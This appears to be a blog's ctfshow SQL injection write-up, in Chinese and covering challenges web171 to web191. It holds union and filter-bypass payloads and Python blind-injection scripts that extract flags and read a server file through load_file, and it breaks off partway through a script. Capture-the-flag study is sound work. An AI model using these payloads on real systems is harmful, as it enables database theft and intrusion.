@@ -1,0 +1,952 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" >
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/my-avatar.png">
+  <link rel="icon" href="/img/my-avatar.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#eef5fa">
+  <meta name="author" content="Xendr1a">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ctfshow SQL 注入专题：联合、盲注、堆叠与 sqlmap 的逐题记录。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ctfshow SQL 注入题解">
+<meta property="og:url" content="https://xendr1a.github.io/2025/08/05/ctfshow-sql/index.html">
+<meta property="og:site_name" content="Xendr1a的小窝">
+<meta property="og:description" content="ctfshow SQL 注入专题：联合、盲注、堆叠与 sqlmap 的逐题记录。">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2025-08-05T02:00:00.000Z">
+<meta property="article:modified_time" content="2026-11-27T07:41:34.965Z">
+<meta property="article:author" content="Xendr1a">
+<meta property="article:tag" content="SQL注入">
+<meta property="article:tag" content="ctfshow">
+<meta name="twitter:card" content="summary_large_image">
+  
+  
+  
+  <title>ctfshow SQL 注入题解 - Xendr1a的小窝</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/custom-soft.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"xendr1a.github.io","root":"/","version":"1.9.9","typing":{"enable":false,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":"¶"},"progressbar":{"enable":true,"height_px":2,"color":"#6f9cba","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":false,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"expand_all":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":false,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"openkounter":{"server_url":"https://open-kounter.mintimate.cn","path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 55vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Xendr1a的小窝</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content (desktop) -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+<!-- Mobile grid menu overlay -->
+<div id="mobile-grid-menu" class="d-lg-none">
+  <div class="mobile-grid-menu-inner">
+    <div class="container">
+      <div class="row">
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-home-fill"></i>
+                  <span>首页</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/archives/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-archive-fill"></i>
+                  <span>归档</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/categories/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-category-fill"></i>
+                  <span>分类</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/tags/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-tags-fill"></i>
+                  <span>标签</span>
+                </div>
+              </a>
+            </div>
+          
+        
+          
+          
+          
+          
+            <div class="col-4 mobile-grid-cell">
+              <a href="/about/" target="_self">
+                <div class="mobile-grid-item">
+                  <i class="iconfont icon-user-fill"></i>
+                  <span>关于</span>
+                </div>
+              </a>
+            </div>
+          
+        
+        
+          <div class="col-4 mobile-grid-cell" id="mobile-search-btn">
+            <a href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <div class="mobile-grid-item">
+                <i class="iconfont icon-search"></i>
+                <span>搜索</span>
+              </div>
+            </a>
+          </div>
+        
+        
+      </div>
+    </div>
+  </div>
+</div>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle">ctfshow SQL 注入题解</span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-08-05 10:00" pubdate>
+          2025年8月5日 上午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          33k 字
+        
+      </span>
+    
+
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ctfshow SQL 注入题解</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h2 id="sql"><a href="#sql" class="headerlink" title="sql"></a>sql</h2><h3 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">//拼接sql语句查找指定ID用户<br>$sql = &quot;select id,username,password from user where username !=&#x27;flag&#x27; and id = &#x27;&quot;.$_GET[&#x27;id&#x27;].&quot;&#x27; limit 1;&quot;;<br></code></pre></td></tr></table></figure>
+
+<p>拼接语句，这边可以用万能密码<code>1&#39; or 1=1 --+</code></p>
+<p>或者因为username不能等于flag，那我们天生反骨就去试试等于，<code>1&#39; or username =&#39;flag</code>也行</p>
+<h3 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h3><p>与上题相比多了个</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">//检查结果是否有flag<br>    if($row-&gt;username!==&#x27;flag&#x27;)&#123;<br>      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>使用联合注入 关键union</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">查看回显位,经过查询发现是两位  -1&#x27; union select 1,2 --+<br>爆破数据库名 -1&#x27; union select 1,database() --+        为ctfshow_web<br>用union注入查出它的列名 id=-1&#x27; union select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_user2&#x27;) --+    列名为：id,username,password<br>代入列名注入，用concat合并字段 id=-1&#x27; union select 1,(select concat(username,password) from ctfshow_user2 where username=&#x27;flag&#x27;) --+<br></code></pre></td></tr></table></figure>
+
+<h3 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h3><p><code>1&#39; union select 1,2,password from ctfshow_user3 --+</code></p>
+<p>直接测试了一下password就出来了。。。</p>
+<h3 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">//检查结果是否有flag<br>    if(!preg_match(&#x27;/flag|[0-9]/i&#x27;, json_encode($ret)))&#123;<br>      $ret[&#x27;msg&#x27;]=&#x27;查询成功&#x27;;<br>    &#125;<br></code></pre></td></tr></table></figure>
+
+<p>多了数字的过滤</p>
+<p>嘶，不会写，去学习一下，</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&#x27; union select &#x27;a&#x27;,replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(password,0,&#x27;g&#x27;),1,&#x27;h&#x27;),2,&#x27;i&#x27;),3,&#x27;j&#x27;),4,&#x27;k&#x27;),5,&#x27;l&#x27;),6,&#x27;m&#x27;),7,&#x27;n&#x27;),8,&#x27;o&#x27;),9,&#x27;p&#x27;) from ctfshow_user4 --+<br></code></pre></td></tr></table></figure>
+
+<p>解释一下<code>replace()</code>函数就是替换的作用，防止返回出现数字以及flag</p>
+<p>贴个大佬的脚本修回flag</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">flag = &#x27;ctfshow&#123;dibcehal-abdb-kkhj-pplb-fddaleiohcgk&#125;&#x27;<br>for i in range(10):<br>    flag = flag.replace(chr(ord(str(i)) + 55), str(i))<br>    print(str(i), chr(ord(str(i)) + 55))<br>print(flag)<br></code></pre></td></tr></table></figure>
+
+<h3 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h3><p>过滤了空格和注释符，这边用&#x2F;**&#x2F;和%23代替</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：1&#x27;union/**/select&#x27;1&#x27;,(select/**/group_concat(password)/**/from/**/ctfshow_user),3%238<br></code></pre></td></tr></table></figure>
+
+<h3 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h3><p>过滤了&#x2F;**&#x2F;，我们可以用%0b或者%09绕过</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:999&#x27;union%0bselect%0b1,(select%0bpassword%0bfrom%0bctfshow_user%0bwhere%0busername%0b=&#x27;flag&#x27;),&#x27;3<br></code></pre></td></tr></table></figure>
+
+<p>看了看其他的payload因为只是过滤掉了&#x2F;**&#x2F; # 等，所以使用万能密码也行</p>
+<h3 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h3><p>过滤了%0b,%09,%0a,我们还有%0c</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:999&#x27;union%0cselect%0c1,(select%0cpassword%0cfrom%0cctfshow_user%0cwhere%0cusername%0c=&#x27;flag&#x27;),&#x27;3<br></code></pre></td></tr></table></figure>
+
+<h3 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h3><p>上题的payload也能用，应该还是过滤了空格</p>
+<h3 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs text">//对传入的参数进行了过滤<br>  function waf($str)&#123;<br>    return preg_match(&#x27;/ |*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select/i&#x27;, $str);<br>  &#125;<br>      <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload:&#x27;or`username`=&#x27;flag<br></code></pre></td></tr></table></figure>
+
+<h3 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h3><p>过滤了flag，用到了like的模糊匹配</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">payload：&#x27;or`username`like&#x27;fla%<br></code></pre></td></tr></table></figure>
+
+<h3 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import time<br><br>url=&quot;http://83593207-b0af-4a8c-9ff8-a55f190892e4.challenge.ctf.show/select-waf.php&quot;<br>response = requests.get(url, verify=False)<br>flag_params=&quot;0123456789-&#123;&#125;qwertyuiopasdfghjklzxcvbnm&quot;<br><br>flag=&quot;&quot;<br><br>for i in range(0,40):<br>	for x in flag_params:<br>		post_data=&#123;<br>			# &quot;tableName&quot;:&quot;`ctfshow_user`where`pass`regexp(\&quot;ctfshow&#123;&#125;\&quot;)&quot;.format(flag+x)<br>			&quot;tableName&quot;:&quot;`ctfshow_user`where`pass`like\&quot;ctfshow&#123;&#125;%\&quot;&quot;.format(flag+x)<br>		&#125;<br>		response = requests.post(url, data=post_data)<br>		time.sleep(0.2)<br>		if response.text.find(&quot;user_count = 1;&quot;)&gt;0 :<br>			print(&quot;&#123;&#125; is right&quot;.format(flag+x))<br>			flag+=x<br>			break<br>		else:<br>			print(&quot;&#123;&#125; is wrong&quot;.format(flag+x))<br>			continue<br>	print(&quot;&#123;&#125; is right flag string&quot;.format(flag))<br></code></pre></td></tr></table></figure>
+
+<p>运行没证书那试试把https改为http</p>
+<h3 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import time<br><br>url = &quot;http://89ebc708-7d70-40ca-8daa-f0e98b159419.challenge.ctf.show/select-waf.php&quot;<br>flag_params = &quot;0123456789-&#123;&#125;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_!@#$%^&amp;*&quot;<br><br>def str2hex(s):<br>    return s.encode().hex()<br><br>def main():<br>    flag = &quot;ctfshow&#123;&quot;<br>    i = len(flag)<br>    while True:<br>        for x in flag_params:<br>            # 构造精确匹配的正则表达式<br>            pattern = f&#x27;^&#123;flag&#125;&#123;x&#125;&#x27;<br>            hex_pattern = str2hex(pattern)<br><br>            post_data = &#123;<br>                &quot;tableName&quot;: f&quot;ctfshow_user group by pass having pass regexp(0x&#123;hex_pattern&#125;) -- &quot;<br>            &#125;<br><br>            try:<br>                response = requests.post(url, data=post_data, timeout=5)<br>                if &quot;user_count = 1;&quot; in response.text:<br>                    flag += x<br>                    print(f&quot;[+] Current flag: &#123;flag&#125;&quot;)<br>                    if x == &#x27;&#125;&#x27;:  # 遇到结束符终止<br>                        print(f&quot;[!] Final flag: &#123;flag&#125;&quot;)<br>                        return<br>                    break<br>                time.sleep(0.5)<br>            except Exception as e:<br>                print(f&quot;[!] Error: &#123;e&#125;&quot;)<br>                time.sleep(2)<br>        else:  # 遍历完所有字符未找到匹配<br>            print(&quot;[!] No matching character found&quot;)<br>            return<br><br>if __name__ == &quot;__main__&quot;:<br>    main()<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">REGEXP 运算符用于在 SQL 查询中匹配文本模式<br></code></pre></td></tr></table></figure>
+
+<p>空格没被过滤了，反而where被过滤了，这里使用having绕过</p>
+<p>然后因为“号被ban的情况下，可以使用16进制去绕过</p>
+<h3 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h3><p>数字被过滤了我们要改数字</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs text">利用到了ture==1<br>ture+ture==2<br>flase==0<br>concat(...) 中的 chr 表达式会动态生成正则表达式字符串（如 ^ctfshow&#123;a）<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br><br>def creatNum(n):  # 3 = true + true + true<br>    str = &#x27;&#x27;<br>    for i in range(1, n + 1):<br>        if i == 1:<br>            str += &quot;true&quot;<br>        else:<br>            str += &quot;+true&quot;<br>    return str<br><br>def creatStr(str):  # 将&#x27;23&#x27;变成 char(true+true),char(true+true+true)<br>    res = &quot;&quot;<br>    for i in range(1, len(str) + 1):<br>        temp = ord(str[i - 1])<br>        if i == 1:<br>            res = &quot;chr(&quot; + creatNum(temp) + &quot;)&quot;<br>        else:<br>            res += &quot;,&quot; + &quot;chr(&quot; + creatNum(temp) + &quot;)&quot;<br>    return res<br><br>url = &quot;http://2bc37396-a458-4aaa-8140-fe38163deb3a.challenge.ctf.show/select-waf.php&quot;<br>letters = letter = r&quot;&#123;0123456789abcdefg-&#125;hijklmnopqrstuvwxyz&quot;<br>flag = &quot;ctfshow&#123;&quot;<br>for i in range(50):<br>    for ch in letters:<br>        result = creatStr(flag + ch)<br>        data = &#123;&quot;tableName&quot;: &quot;ctfshow_user group by pass having pass regexp(concat(&#123;&#125;))&quot;.format(result)&#125;<br>        res = requests.post(url=url, data=data)<br>        if &quot;$user_count = 1;&quot; in res.text:<br>            flag += ch<br>            print(flag)<br>            break  <br></code></pre></td></tr></table></figure>
+
+<h3 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h3><p>新增过滤  %|&lt;|&gt;|^</p>
+<p>上个脚本一样能用</p>
+<h3 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs text">username:admin<br>password:ffifdyop<br></code></pre></td></tr></table></figure>
+
+<h3 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h3><p>admin和password都是弱比较匹配</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">select pass from ctfshow_user where username = 0 and password = 0;，由于username password是字符串，弱比较成了0,0=0成立，所条件就成立了；最后查询语句就成了：select pass from ctfshow_user where 1;<br></code></pre></td></tr></table></figure>
+
+<h3 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h3><p>盲注，主要抓包注意到回显不同，然后利用load_file读取文件</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br><br>url = &quot;http://662ee5eb-523f-49db-8748-fca2a6d708e3.challenge.ctf.show/api/index.php&quot;<br><br>str = &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;<br><br>flag = &quot;ctfshow&#123;&quot;<br><br>for i in range(0,100):<br><br> for j in str:<br><br>    data = &#123;&quot;username&quot;:&quot;if(load_file(&#x27;/var/www/html/api/index.php&#x27;)regexp(&#x27;&#123;&#125;&#x27;),0,1)&quot;.format(flag + j),<br><br>            &quot;password&quot;:0&#125;<br><br>    res = requests.post(url=url, data=data)<br><br>    if r&quot;\u5bc6\u7801\u9519\u8bef&quot; in res.text:<br><br>        flag += j<br><br>        print(flag)<br><br>        if j==&quot;&#125;&quot;:<br><br>            exit()<br><br>        break<br></code></pre></td></tr></table></figure>
+
+<h3 id="web190"><a href="#web190" class="headerlink" title="web190"></a>web190</h3><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import sys<br>import time<br><br>url = &quot;http://2920a50f-f57e-4f76-b994-bb34c8783643.challenge.ctf.show/api/&quot;<br>flag = &quot;&quot;<br>for i in range(1,60):<br>    max = 127<br>    min = 32<br>    while 1:<br>        mid = (max+min)&gt;&gt;1<br>        if(min == mid):<br>            flag += chr(mid)<br>            print(flag)<br>            break<br>        #payload = &quot;admin&#x27;and (ascii(substr((select database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #ctfshow_web<br>        #payload = &quot;admin&#x27;and (ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #ctfshow_fl0g<br>        #payload = &quot;admin&#x27;and (ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=&#x27;ctfshow_fl0g&#x27;),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br>        #id,f1ag<br>        payload = &quot;admin&#x27;and (ascii(substr((select f1ag from ctfshow_fl0g),&#123;&#125;,1))&lt;&#123;&#125;)#&quot;.format(i,mid)<br><br>        data = &#123;<br>            &quot;username&quot;:payload,<br>            &quot;password&quot;:0,<br>        &#125;<br>        res = requests.post(url = url,data =data)<br>        time.sleep(0.3)<br>        if res.text.find(&quot;8bef&quot;)&gt;0:<br>            max = mid<br>        else:<br>            min = mid<br></code></pre></td></tr></table></figure>
+
+<h3 id="web191（布尔盲注"><a href="#web191（布尔盲注" class="headerlink" title="web191（布尔盲注"></a>web191（布尔盲注</h3><p>ascii被过滤了，我们可以使用作用基本上相同的ord</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs text">import requests<br>import sys<br>import time<br><br>url = &quot;http://c5f6403a-b365-4e18-9aa8-45c52d21e570.challenge.ctf.show/api/&quot;<br>flag = &quot;&quot;<br>for i in range(1,60):<br>    max = 127<br>    min = 32<br>    while 1:<br>        mid = (max+min)&gt;&gt;1<br>        if(min == mid):<br>            flag += chr(mid)<br>            print(flag)<br>            break<br>        #payload = &quot;admin&#x27;and (ascii(substr((select 